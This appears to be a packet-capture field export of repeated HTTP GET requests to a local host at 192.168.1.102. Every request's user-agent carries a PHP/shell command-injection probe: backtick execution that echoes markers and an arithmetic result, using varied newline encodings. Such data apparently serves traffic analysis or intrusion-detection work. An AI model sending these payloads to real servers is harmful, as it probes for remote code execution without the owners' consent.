http.accept	http.accept_encoding	http.accept_language	http.authbasic	http.authcitrix	http.authcitrix.domain	http.authcitrix.password	http.authcitrix.session	http.authcitrix.user	http.authorization	http.bad_header_name	http.cache_control	http.chat	http.chunk_boundary	http.chunk_size	http.chunkd_and_length	http.chunked_trailer_part	http.connection	http.content_encoding	http.content_length	http.content_length_header	http.content_type	http.cookie_pair	http.date	http.decompression_disabled	http.decompression_failed	http.file_data	http.host	http.http2_settings	http.http2_settings_uri	http.last_modified	http.leading_crlf	http.location	http.next_request_in	http.next_response_in	http.notification	http.prev_request_in	http.proxy_authenticate	http.proxy_authorization	http.proxy_connect_host	http.proxy_connect_port	http.referer	http.request	http.request.full_uri	http.request.line	http.request.method	http.request.uri.path	http.request.uri.query	http.request.uri.query.parameter	http.request.version	http.request_in	http.request_number	http.sec_websocket_accept	http.sec_websocket_extensions	http.sec_websocket_key	http.sec_websocket_protocol	http.sec_websocket_version	http.server	http.set_cookie	http.ssl_port	http.subdissector_failed	http.te_and_length	http.te_unknown	http.time	http.tls_port	http.transfer_encoding	http.unknown_header	http.upgrade	http.user_agent	http.www_authenticate	http.x_forwarded_for	http.cookie	http.request.uri
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			.print(`echo KYXGDI%0aecho $((82+36))%0aecho KYXGDI%0aecho KYXGDI`);}}				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			.print(`echo KYXGDI%0aecho $((82+36))%0aecho KYXGDI%0aecho KYXGDI`);}}				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			.print(`echo KYXGDI%0aecho $((82+36))%0aecho KYXGDI%0aecho KYXGDI`);}}				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			.print(`echo KYXGDI%0aecho $((82+36))%0aecho KYXGDI%0aecho KYXGDI`);}}				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			.print(`echo KYXGDI%0aecho $((82+36))%0aecho KYXGDI%0aecho KYXGDI`);}}				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			.print(`echo KYXGDI%0aecho $((82+36))%0aecho KYXGDI%0aecho KYXGDI`);}}				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			.print(`echo KKKJFK\necho $((28+76))\necho KKKJFK\necho KKKJFK`);}}				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			.print(`echo KKKJFK\necho $((28+76))\necho KKKJFK\necho KKKJFK`);}}				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			.print(`echo KKKJFK\necho $((28+76))\necho KKKJFK\necho KKKJFK`);}}				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			.print(`echo KKKJFK\necho $((28+76))\necho KKKJFK\necho KKKJFK`);}}				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			.print(`echo KKKJFK\necho $((28+76))\necho KKKJFK\necho KKKJFK`);}}				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			.print(`echo KKKJFK\necho $((28+76))\necho KKKJFK\necho KKKJFK`);}}				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			.print(`echo KKKJFK\necho $((28+76))\necho KKKJFK\necho KKKJFK`);}}				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			.print(`echo KKKJFK\necho $((28+76))\necho KKKJFK\necho KKKJFK`);}}				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			.print(`echo JJSVQP%0d%0aecho $((1+55))%0d%0aecho JJSVQP%0d%0aecho JJSVQP`);}}				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			.print(`echo JJSVQP%0d%0aecho $((1+55))%0d%0aecho JJSVQP%0d%0aecho JJSVQP`);}}				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			.print(`echo JJSVQP%0d%0aecho $((1+55))%0d%0aecho JJSVQP%0d%0aecho JJSVQP`);}}				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			.print(`echo JJSVQP%0d%0aecho $((1+55))%0d%0aecho JJSVQP%0d%0aecho JJSVQP`);}}				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			.print(`echo JJSVQP%0d%0aecho $((1+55))%0d%0aecho JJSVQP%0d%0aecho JJSVQP`);}}				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			.print(`echo JJSVQP%0d%0aecho $((1+55))%0d%0aecho JJSVQP%0d%0aecho JJSVQP`);}}				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			.print(`echo JJSVQP%0d%0aecho $((1+55))%0d%0aecho JJSVQP%0d%0aecho JJSVQP`);}}				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			.print(`echo JJSVQP%0d%0aecho $((1+55))%0d%0aecho JJSVQP%0d%0aecho JJSVQP`);}}				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			.print(`echo YOMLZW\r\necho $((86+80))\r\necho YOMLZW\r\necho YOMLZW`);}}				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			.print(`echo YOMLZW\r\necho $((86+80))\r\necho YOMLZW\r\necho YOMLZW`);}}				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			.print(`echo YOMLZW\r\necho $((86+80))\r\necho YOMLZW\r\necho YOMLZW`);}}				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			.print(`echo YOMLZW\r\necho $((86+80))\r\necho YOMLZW\r\necho YOMLZW`);}}				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			.print(`echo YOMLZW\r\necho $((86+80))\r\necho YOMLZW\r\necho YOMLZW`);}}				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			.print(`echo YOMLZW\r\necho $((86+80))\r\necho YOMLZW\r\necho YOMLZW`);}}				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			.print(`echo YOMLZW\r\necho $((86+80))\r\necho YOMLZW\r\necho YOMLZW`);}}				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			.print(`echo YOMLZW\r\necho $((86+80))\r\necho YOMLZW\r\necho YOMLZW`);}}				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			.print(`echo MOEEBT`.`echo $((20+30))`.`echo MOEEBT`.`echo MOEEBT`)."				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			.print(`echo MOEEBT`.`echo $((20+30))`.`echo MOEEBT`.`echo MOEEBT`)."				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			.print(`echo MOEEBT`.`echo $((20+30))`.`echo MOEEBT`.`echo MOEEBT`)."				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			.print(`echo MOEEBT`.`echo $((20+30))`.`echo MOEEBT`.`echo MOEEBT`)."				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			.print(`echo MOEEBT`.`echo $((20+30))`.`echo MOEEBT`.`echo MOEEBT`)."				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			.print(`echo MOEEBT`.`echo $((20+30))`.`echo MOEEBT`.`echo MOEEBT`)."				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			.print(`echo MOEEBT`.`echo $((20+30))`.`echo MOEEBT`.`echo MOEEBT`)."				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			.print(`echo MOEEBT`.`echo $((20+30))`.`echo MOEEBT`.`echo MOEEBT`)."				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			.print(`echo BIPQEP%0aecho $((72+49))%0aecho BIPQEP%0aecho BIPQEP`);."				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			.print(`echo BIPQEP%0aecho $((72+49))%0aecho BIPQEP%0aecho BIPQEP`);."				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			.print(`echo BIPQEP%0aecho $((72+49))%0aecho BIPQEP%0aecho BIPQEP`);."				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			.print(`echo BIPQEP%0aecho $((72+49))%0aecho BIPQEP%0aecho BIPQEP`);."				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			.print(`echo BIPQEP%0aecho $((72+49))%0aecho BIPQEP%0aecho BIPQEP`);."				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			.print(`echo BIPQEP%0aecho $((72+49))%0aecho BIPQEP%0aecho BIPQEP`);."				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			.print(`echo BIPQEP%0aecho $((72+49))%0aecho BIPQEP%0aecho BIPQEP`);."				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			.print(`echo BIPQEP%0aecho $((72+49))%0aecho BIPQEP%0aecho BIPQEP`);."				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			.print(`echo HUDPWL\necho $((74+95))\necho HUDPWL\necho HUDPWL`);."				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			.print(`echo HUDPWL\necho $((74+95))\necho HUDPWL\necho HUDPWL`);."				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			.print(`echo HUDPWL\necho $((74+95))\necho HUDPWL\necho HUDPWL`);."				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			.print(`echo HUDPWL\necho $((74+95))\necho HUDPWL\necho HUDPWL`);."				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			.print(`echo HUDPWL\necho $((74+95))\necho HUDPWL\necho HUDPWL`);."				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			.print(`echo HUDPWL\necho $((74+95))\necho HUDPWL\necho HUDPWL`);."				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			.print(`echo HUDPWL\necho $((74+95))\necho HUDPWL\necho HUDPWL`);."				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			.print(`echo HUDPWL\necho $((74+95))\necho HUDPWL\necho HUDPWL`);."				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			.print(`echo ZFUEDL%0d%0aecho $((61+84))%0d%0aecho ZFUEDL%0d%0aecho ZFUEDL`);."				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			.print(`echo ZFUEDL%0d%0aecho $((61+84))%0d%0aecho ZFUEDL%0d%0aecho ZFUEDL`);."				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			.print(`echo ZFUEDL%0d%0aecho $((61+84))%0d%0aecho ZFUEDL%0d%0aecho ZFUEDL`);."				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			.print(`echo ZFUEDL%0d%0aecho $((61+84))%0d%0aecho ZFUEDL%0d%0aecho ZFUEDL`);."				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			.print(`echo ZFUEDL%0d%0aecho $((61+84))%0d%0aecho ZFUEDL%0d%0aecho ZFUEDL`);."				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			.print(`echo ZFUEDL%0d%0aecho $((61+84))%0d%0aecho ZFUEDL%0d%0aecho ZFUEDL`);."				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			.print(`echo ZFUEDL%0d%0aecho $((61+84))%0d%0aecho ZFUEDL%0d%0aecho ZFUEDL`);."				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			.print(`echo ZFUEDL%0d%0aecho $((61+84))%0d%0aecho ZFUEDL%0d%0aecho ZFUEDL`);."				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			.print(`echo VQVALV\r\necho $((94+67))\r\necho VQVALV\r\necho VQVALV`);."				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			.print(`echo VQVALV\r\necho $((94+67))\r\necho VQVALV\r\necho VQVALV`);."				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			.print(`echo VQVALV\r\necho $((94+67))\r\necho VQVALV\r\necho VQVALV`);."				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			.print(`echo VQVALV\r\necho $((94+67))\r\necho VQVALV\r\necho VQVALV`);."				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			.print(`echo VQVALV\r\necho $((94+67))\r\necho VQVALV\r\necho VQVALV`);."				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			.print(`echo VQVALV\r\necho $((94+67))\r\necho VQVALV\r\necho VQVALV`);."				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			.print(`echo VQVALV\r\necho $((94+67))\r\necho VQVALV\r\necho VQVALV`);."				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			.print(`echo VQVALV\r\necho $((94+67))\r\necho VQVALV\r\necho VQVALV`);."				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			.print(`echo LUEXRZ`.`echo $((44+77))`.`echo LUEXRZ`.`echo LUEXRZ`).'				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			.print(`echo LUEXRZ`.`echo $((44+77))`.`echo LUEXRZ`.`echo LUEXRZ`).'				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			.print(`echo LUEXRZ`.`echo $((44+77))`.`echo LUEXRZ`.`echo LUEXRZ`).'				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			.print(`echo LUEXRZ`.`echo $((44+77))`.`echo LUEXRZ`.`echo LUEXRZ`).'				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			.print(`echo LUEXRZ`.`echo $((44+77))`.`echo LUEXRZ`.`echo LUEXRZ`).'				/web
